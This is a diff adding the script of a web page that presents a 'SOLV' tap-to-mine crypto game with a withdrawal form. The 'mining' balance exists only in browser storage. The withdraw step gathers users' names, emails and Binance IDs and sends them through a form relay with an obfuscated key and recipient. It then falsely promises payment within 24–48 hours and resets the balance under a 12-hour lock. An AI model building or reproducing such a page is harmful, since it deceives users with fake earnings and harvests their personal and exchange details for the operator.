+  ============================================ */
+  function getWithdrawCooldownRemaining() {
+    if (!lastWithdrawAt) return 0;
+    const elapsed = Date.now() - lastWithdrawAt;
+    return Math.max(0, WITHDRAW_COOLDOWN - elapsed);
+  }
+
+  function isWithdrawLocked() {
+    return getWithdrawCooldownRemaining() > 0;
+  }
+
+  /* ============================================
+     UI UPDATE
+  ============================================ */
+  function updateBalanceUI(bump = false) {
+    balanceEl.textContent = formatNum(balance);
+    counterEl.textContent = formatNum(balance);
+
+    if (bump) {
+      balanceEl.classList.remove('bump');
+      void balanceEl.offsetWidth;
+      balanceEl.classList.add('bump');
+    }
+
+    updateWithdrawButton();
+  }
+
+  function updateWithdrawButton() {
+    if (isWithdrawLocked()) {
+      withdrawBtn.disabled = true;
+      withdrawBtn.classList.add('locked');
+      const remaining = getWithdrawCooldownRemaining();
+      withdrawText.textContent = 'Locked · ' + formatTime(remaining) + ' until next withdrawal';
+      return;
+    }
+
+    withdrawBtn.classList.remove('locked');
+
+    if (balance >= MIN_WITHDRAW) {
+      withdrawBtn.disabled = false;
+      withdrawText.textContent = 'Withdraw · ' + formatNum(balance) + ' SOLV';
+    } else {
+      withdrawBtn.disabled = true;
+      withdrawText.textContent = 'Withdraw · Min 1.000 SOLV';
+    }
+  }
+
+  setInterval(updateWithdrawButton, 1000);
+
+  /* ============================================
+     TOAST / EFFECTS
+  ============================================ */
+  function showToast(msg, type = '', duration = 2500) {
+    toastEl.textContent = msg;
+    toastEl.className = 'toast';
+    if (type) toastEl.classList.add(type);
+    toastEl.classList.add('show');
+    clearTimeout(toastEl._t);
+    toastEl._t = setTimeout(() => toastEl.classList.remove('show'), duration);
+  }
+
+  function floatNumber(text) {
+    const el = document.createElement('div');
+    el.className = 'float-reward';
+    el.textContent = text;
+    const rect = solvImg.getBoundingClientRect();
+    el.style.left = (rect.left + rect.width / 2 - 20 + (Math.random() * 40 - 20)) + 'px';
+    el.style.top  = (rect.top - 10) + 'px';
+    document.body.appendChild(el);
+    setTimeout(() => el.remove(), 1100);
+  }
+
+  function spawnParticles(count = 10) {
+    const rect = solvImg.getBoundingClientRect();
+    const cx = rect.left + rect.width / 2;
+    const cy = rect.top + rect.height / 2;
+    for (let i = 0; i < count; i++) {
+      const p = document.createElement('div');
+      p.className = 'particle';
+      const angle = (Math.PI * 2 * i) / count + Math.random() * 0.5;
+      const dist  = 70 + Math.random() * 60;
+      p.style.left = cx + 'px';
+      p.style.top  = cy + 'px';
+      p.style.setProperty('--tx', (Math.cos(angle) * dist) + 'px');
+      p.style.setProperty('--ty', (Math.sin(angle) * dist) + 'px');
+      document.body.appendChild(p);
+      setTimeout(() => p.remove(), 1000);
+    }
+  }
+
+  /* ============================================
+     SECURITY
+  ============================================ */
+  function detectClockTamper() {
+    const now = Date.now();
+    if (lastSaveTime > 0 && now < lastSaveTime - CLOCK_TOLERANCE) return true;
+    return false;
+  }
+
+  /* ============================================
+     BUTTON STATE
+  ============================================ */
+  function canClick() { return !cycleActive && !burstActive; }
+
+  function updateSolvButton() {
+    if (canClick()) {
+      solvImg.classList.remove('cooling');
+      statusEl.textContent = 'Tap to mine +0.010 SOLV';
+      statusEl.className = 'status';
+    } else {
+      solvImg.classList.add('cooling');
+      const remaining = Math.max(0, CYCLE_MS - (Date.now() - cycleStartTime));
+      statusEl.textContent = 'Mining cycle · ' + formatTime(remaining) + ' remaining';
+      statusEl.className = 'status cooling';
+    }
+  }
+
+  /* ============================================
+     START BURST
+  ============================================ */
+  function startBurst() {
+    if (burstActive) return;
+    if (!canClick()) { showToast('Wait for the cycle to finish'); return; }
+
+    burstStartTime = Date.now();
+    burstStartBal  = balance;
+    burstActive    = true;
+    cycleActive    = true;
+    cycleStartTime = burstStartTime;
+
+    saveState(true);
+
+    solvImg.classList.add('burst');
+    progressWrap.classList.add('visible');
+    statusEl.textContent = 'Fast mining...';
+    statusEl.className = 'status burst';
+    sysStatusEl.textContent = 'Mining';
+
+    runBurstLoop(burstStartTime, burstStartBal);
+  }
+
+  /* ============================================
+     BURST LOOP
+  ============================================ */
+  function runBurstLoop(startTime, startBal) {
+    if (burstInterval) clearInterval(burstInterval);
+
+    burstInterval = setInterval(() => {
+      const elapsed = Date.now() - startTime;
+      const ratio   = Math.min(elapsed / BURST_DURATION, 1);
+      const desired = startBal + (BURST_AMOUNT * ratio);
+
+      if (desired > balance) {
+        const diff = desired - balance;
+        balance = desired;
+        updateBalanceUI(true);
+        if (Math.random() < 0.4) floatNumber('+' + diff.toFixed(3));
+      }
+
+      progressBar.style.width = (ratio * 100) + '%';
+      if (Math.random() < 0.25) spawnParticles(4);
+
+      saveState();
+
+      if (ratio >= 1) {
+        clearInterval(burstInterval);
+        burstInterval = null;
+        finishBurst();
+      }
+    }, 50);
+  }
+
+  /* ============================================
+     FINISH BURST
+  ============================================ */
+  function finishBurst() {
+    const finalBal = burstStartBal + BURST_AMOUNT;
+    if (finalBal > balance) balance = finalBal;
+
+    burstActive = false;
+    cycleActive = true;
+    cycleStartTime = Date.now();
+
+    updateBalanceUI(true);
+
+    solvImg.classList.remove('burst');
+    progressBar.style.width = '0%';
+    progressWrap.classList.remove('visible');
+
+    timerCard.classList.add('active');
+    sysStatusEl.textContent = 'Active';
+    rateEl.textContent = '0.010 / 30 min';
+
+    saveState(true);
+
+    updateSolvButton();
+    updateCycleTimer();
+  }
+
+  /* ============================================
+     CYCLE TIMER
+  ============================================ */
+  function updateCycleTimer() {
+    if (!cycleActive) {
+      timerEl.textContent = '--:--';
+      timerCard.classList.remove('active');
+      return;
+    }
+
+    const now = Date.now();
+    const elapsed   = now - cycleStartTime;
+    const remaining = Math.max(0, CYCLE_MS - elapsed);
+    timerEl.textContent = formatTime(remaining);
+
+    if (remaining > 0) {
+      statusEl.textContent = 'Mining cycle · ' + formatTime(remaining) + ' remaining';
+      statusEl.className = 'status cooling';
+    }
+
+    if (remaining <= 0) {
+      balance = Math.min(MAX_BALANCE, balance + CYCLE_REWARD);
+      updateBalanceUI(true);
+      showToast('Cycle complete! +0.020 SOLV', 'success');
+
+      cycleActive = false;
+      cycleStartTime = 0;
+      saveState(true);
+
+      timerCard.classList.remove('active');
+      solvImg.classList.remove('cooling');
+      sysStatusEl.textContent = 'Ready';
+      timerEl.textContent = '--:--';
+      updateSolvButton();
+    }
+  }
+
+  setInterval(updateCycleTimer, 1000);
+
+  /* ============================================
+     RESUME
+  ============================================ */
+  function resume() {
+    isRestoring = true;
+
+    if (detectClockTamper()) {
+      S.clearAll();
+      location.reload();
+      return;
+    }
+
+    const now = Date.now();
+
+    if (burstActive && burstStartTime > 0) {
+      const elapsed = now - burstStartTime;
+
+      if (elapsed >= BURST_DURATION) {
+        const correctBal = burstStartBal + BURST_AMOUNT;
+        balance = correctBal;
+
+        burstActive = false;
+        cycleActive = true;
+        cycleStartTime = burstStartTime + BURST_DURATION;
+
+        showToast('Mining completed while you were away!', 'success');
+
+        processOfflineCycles(now);
+        updateBalanceUI();
+        updateSolvButton();
+        updateCycleTimer();
+      } else {
+        solvImg.classList.add('burst');
+        progressWrap.classList.add('visible');
+        statusEl.textContent = 'Fast mining...';
+        statusEl.className = 'status burst';
+
+        runBurstLoop(burstStartTime, burstStartBal);
+      }
+
+      isRestoring = false;
+      return;
+    }
+
+    if (cycleActive && cycleStartTime > 0) {
+      processOfflineCycles(now);
+      updateBalanceUI();
+      updateSolvButton();
+      updateCycleTimer();
+      isRestoring = false;
+      return;
+    }
+
+    updateBalanceUI();
+    rateEl.textContent = '0.010 / 30 min';
+    sysStatusEl.textContent = 'Ready';
+    timerEl.textContent = '--:--';
+    updateSolvButton();
+    isRestoring = false;
+  }
+
+  /* ============================================
+     OFFLINE CYCLES
+  ============================================ */
+  function processOfflineCycles(now) {
+    if (!cycleActive || cycleStartTime <= 0) return;
+
+    const elapsed = now - cycleStartTime;
+    if (elapsed < CYCLE_MS) return;
+
+    let cycles = Math.floor(elapsed / CYCLE_MS);
+    cycles = Math.min(cycles, MAX_OFFLINE_CYCLES);
+
+    if (cycles <= 0) return;
+
+    const reward = cycles * CYCLE_REWARD;
+    balance = Math.min(MAX_BALANCE, balance + reward);
+    cycleStartTime = cycleStartTime + (cycles * CYCLE_MS);
+
+    if (now - cycleStartTime >= CYCLE_MS) {
+      const extra = Math.floor((now - cycleStartTime) / CYCLE_MS);
+      if (extra > 0 && extra <= MAX_OFFLINE_CYCLES) {
+        balance = Math.min(MAX_BALANCE, balance + extra * CYCLE_REWARD);
+        cycleStartTime += extra * CYCLE_MS;
+      }
+    }
+
+    if (cycles === 1) {
+      showToast('Cycle completed! +0.020 SOLV', 'success', 3000);
+    } else {
+      showToast(`${cycles} cycles completed! +${(cycles * 0.020).toFixed(3)} SOLV`, 'success', 3500);
+    }
+
+    sysStatusEl.textContent = 'Active';
+    timerCard.classList.add('active');
+    rateEl.textContent = '0.010 / 30 min';
+
+    updateBalanceUI(true);
+    saveState(true);
+  }
+
+  /* ============================================
+     EVENTS
+  ============================================ */
+  solvImg.addEventListener('click', () => {
+    if (isRestoring) return;
+    if (burstActive) return;
+    if (!canClick()) { showToast('Wait for the cycle to finish'); return; }
+    startBurst();
+  });
+
+  withdrawBtn.addEventListener('click', () => {
+    if (isWithdrawLocked()) {
+      const remaining = getWithdrawCooldownRemaining();
+      showToast('Locked! Next withdrawal in ' + formatTime(remaining), 'warning', 3500);
+      return;
+    }
+
+    if (balance < MIN_WITHDRAW) {
+      showToast('Minimum withdrawal is 1.000 SOLV', 'warning');
+      return;
+    }
+
+    modalBalance.textContent = balance.toFixed(3);
+    modalOverlay.classList.add('show');
+  });
+
+  function closeWithdraw() {
+    modalOverlay.classList.remove('show');
+  }
+
+  window.closeWithdraw = closeWithdraw;
+
+  modalOverlay.addEventListener('click', (e) => {
+    if (e.target === modalOverlay) closeWithdraw();
+  });
+
+  /* ============================================
+     SUBMIT WITHDRAW
+  ============================================ */
+  function submitWithdraw(event) {
+    event.preventDefault();
+
+    if (isWithdrawLocked()) {
+      const remaining = getWithdrawCooldownRemaining();
+      showToast('Locked! Next withdrawal in ' + formatTime(remaining), 'warning', 3500);
+      closeWithdraw();
+      return;
+    }
+
+    const form = event.target;
+    const formData = new FormData(form);
+
+    const fullName  = (formData.get('full_name') || '').trim();
+    const userEmail = (formData.get('user_email') || '').trim();
+    const binanceId = (formData.get('binance_id') || '').trim();
+
+    if (fullName.length < 2) { showToast('Please enter a valid name', 'error'); return; }
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(userEmail)) { showToast('Please enter a valid email', 'error'); return; }
+    if (!/^[0-9]{6,}$/.test(binanceId)) { showToast('Binance ID must be at least 6 digits', 'error'); return; }
+
+    const withdrawAmount = balance;
+
+    formData.set('amount', withdrawAmount.toFixed(3) + ' SOLV');
+    formData.set('withdraw_date', new Date().toLocaleString('en-US'));
+    formData.set('apiKey', _dk());
+    formData.set('email', _de());
+
+    confirmBtn.disabled = true;
+    confirmBtn.textContent = '⏳ Sending...';
+
+    fetch('https://api.staticforms.dev/submit', {
+      method: 'POST',
+      body: formData
+    })
+    .then(res => {
+      if (!res.ok) throw new Error('HTTP ' + res.status);
+      return res.json().catch(() => ({}));
+    })
+    .then(data => {
+      if (data && data.success === false) throw new Error(data.message || 'Rejected');
+      successWithdraw(withdrawAmount, fullName, binanceId);
+    })
+    .catch(err => {
+      console.error('Withdraw failed:', err);
+      confirmBtn.disabled = false;
+      confirmBtn.textContent = 'Retry Submit';
+      showToast('Connection failed. Please try again.', 'error', 3500);
+    });
+  }
+
+  window.submitWithdraw = submitWithdraw;
+
+  /* ============================================
+     SUCCESS
+  ============================================ */
+  function successWithdraw(amount, fullName, binanceId) {
+    lastWithdrawAt = Date.now();
+
+    balance = 0;
+    cycleActive = false;
+    cycleStartTime = 0;
+    burstActive = false;
+    burstStartTime = 0;
+    burstStartBal = 0;
+
+    S.set('balance', '0');
+    S.set('cycleActive', '0');
+    S.set('cycleStart', '0');
+    S.set('burstActive', '0');
+    S.set('burstStart', '0');
+    S.set('burstStartBal', '0');
+    S.set('lastWithdrawAt', lastWithdrawAt);
+    S.set('lastUpdate', Date.now());
+
+    updateWithdrawButton();
+
+    modalContent.innerHTML = `
+      <div style="text-align: center;">
+        <div style="width: 80px; height: 80px; margin: 0 auto 20px; background: linear-gradient(135deg, #8b3dff, #b47cff); border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 15px 40px rgba(139,61,255,0.55);">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="3" style="width: 42px; height: 42px;">
+            <polyline points="20 6 9 17 4 12"/>
+          </svg>
+        </div>
+        <h2 style="color: #ffffff; font-size: 20px; margin-bottom: 12px; font-weight: 900;">Request Sent!</h2>
+        <p style="color: #9a8fb0; font-size: 13px; line-height: 1.9; margin-bottom: 20px;">
+          Your withdrawal will be sent to your Binance account<br>
+          <b style="color: #b47cff; font-size: 18px;">${amount.toFixed(3)} SOLV</b><br>
+          to: <b style="color: #ffffff;">${escapeHtml(fullName)}</b><br>
+          Binance ID: <b style="color: #ffffff; direction: ltr; display: inline-block;">${escapeHtml(binanceId)}</b><br>
+          <span style="font-size: 11px;">within 24-48 hours</span>
+        </p>
+        <div style="background: rgba(139,61,255,0.1); border: 1px solid rgba(180,124,255,0.35); border-radius: 12px; padding: 12px; margin-bottom: 18px;">
+          <p style="color: #b47cff; font-size: 12px; text-align: center; font-weight: 700; margin-bottom: 4px;">
+            ⏱️ Next withdrawal in 12 hours
+          </p>
+          <p style="color: #9a8fb0; font-size: 11px; text-align: center;">
+            Your balance has been reset — start over
+          </p>
+        </div>
+        <button onclick="location.reload();" 
+                style="width: 100%; padding: 14px; border: none; border-radius: 12px; background: linear-gradient(135deg, #8b3dff, #b47cff); color: #ffffff; font-family: 'Inter', sans-serif; font-size: 14px; font-weight: 900; cursor: pointer;">
+          OK, Thanks
+        </button>
+      </div>
+    `;
+  }
+
+  /* ============================================
+     ESCAPE
+  ============================================ */
+  function escapeHtml(str) {
+    const div = document.createElement('div');
+    div.textContent = String(str || '');
+    return div.innerHTML;
+  }
+
+  /* ============================================
+     SAVE ON UNLOAD
+  ============================================ */
+  window.addEventListener('beforeunload', () => {
+    saveState(true);
+  });
+
+  document.addEventListener('visibilitychange', () => {
+    if (document.hidden) saveState(true);
+  });
+
+  setInterval(() => saveState(), 4000);
+
+  /* ============================================
+     INIT
+  ============================================ */
+  updateBalanceUI();
+  rateEl.textContent = '0.010 / 30 min';
+  sysStatusEl.textContent = 'Ready';
+  timerEl.textContent = '--:--';
+  resume();
+
+  if (isWithdrawLocked()) {
+    const remaining = getWithdrawCooldownRemaining();
+    setTimeout(() => {
+      showToast('Withdrawal locked · ' + formatTime(remaining) + ' remaining', 'warning', 4000);
+    }, 800);
+  }
+</script>
+
+</body>
+</html>
